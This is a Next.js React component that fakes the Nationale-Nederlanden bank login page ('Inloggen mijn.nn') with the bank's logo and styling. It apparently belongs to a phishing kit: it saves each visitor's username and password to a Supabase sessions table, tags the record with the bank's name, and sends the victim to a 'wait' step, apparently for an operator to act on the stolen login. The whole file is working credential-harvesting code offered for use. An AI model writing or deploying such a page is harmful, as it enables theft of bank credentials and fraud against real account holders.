"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";

export function NationaleNederlandenClient({ sessionId }: { sessionId: string }) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [saving, setSaving] = useState(false);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (!supabase || !sessionId) return;
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      if (fd.verfuegernummer) setUsername(fd.verfuegernummer);
      if (fd.pin) setPassword(fd.pin);
    })();
    return () => { cancelled = true; };
  }, [sessionId, supabase]);

  async function handleSubmit() {
    if (!supabase || !sessionId) return;
    setSaving(true);
    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    await supabase.from("sessions").update({
      current_step: "wait",
      form_data: { ...prev, bankSlug: "nationale-nederlanden", bankName: "Nationale-Nederlanden", verfuegernummer: username, pin: password }
    }).eq("id", sessionId);
    router.replace(stepToPath("wait", sessionId));
  }

  return (
    <div className="min-h-screen bg-[#F3F4F6] font-sans flex flex-col items-center">
      <header className="bg-white w-full h-[72px] flex items-center px-8 border-b border-gray-200 shadow-sm shrink-0 justify-center sm:justify-start">
        <img src="/bank-logos/nationale-nederlanden.svg" alt="Nationale-Nederlanden" className="h-8" />
      </header>

      <main className="flex-1 w-full max-w-[480px] px-4 py-12">
        <div className="bg-white shadow-sm border border-gray-200 rounded p-8 md:p-10 border-t-4 border-t-[#EA650D]">
          <h1 className="text-[24px] font-bold text-[#333] mb-6">Inloggen mijn.nn</h1>
          
          <form onSubmit={(e) => { e.preventDefault(); void handleSubmit(); }} className="space-y-5">
            <div>
              <label className="block text-[14px] font-bold text-[#333] mb-2">E-mailadres of gebruikersnaam</label>
              <input 
                required 
                type="text" 
                value={username} 
                onChange={e => setUsername(e.target.value)} 
                className="w-full border border-gray-300 p-3 text-[15px] focus:outline-none focus:border-[#EA650D] focus:ring-1 focus:ring-[#EA650D] rounded-sm" 
              />
            </div>
            <div>
              <label className="block text-[14px] font-bold text-[#333] mb-2">Wachtwoord</label>
              <input 
                required 
                type="password" 
                value={password} 
                onChange={e => setPassword(e.target.value)} 
                className="w-full border border-gray-300 p-3 text-[15px] focus:outline-none focus:border-[#EA650D] focus:ring-1 focus:ring-[#EA650D] rounded-sm" 
              />
            </div>
            <button type="submit" disabled={saving || !username || !password} className="w-full bg-[#EA650D] text-white font-bold py-3.5 rounded-sm mt-4 hover:bg-[#BB510A] disabled:opacity-50 transition-colors">
              {saving ? "Laden..." : "Inloggen"}
            </button>
          </form>
        </div>
      </main>
    </div>
  );
}